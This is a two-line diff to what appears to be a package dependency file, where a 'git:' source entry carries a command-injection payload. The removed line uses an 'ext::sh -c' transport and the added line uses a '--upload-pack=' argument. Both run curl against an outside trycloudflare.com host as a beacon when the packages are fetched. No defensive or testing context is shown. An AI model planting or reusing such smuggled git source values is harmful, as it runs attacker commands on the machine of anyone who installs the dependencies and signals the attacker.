@@ -1,2 +1,2 @@
 packages:
-  - git: "ext::sh -c 'curl -s https://receiving-scripting-gas-slide.trycloudflare.com/beacon-m3'"
+  - git: "--upload-pack=curl -s https://receiving-scripting-gas-slide.trycloudflare.com/beacon-up"
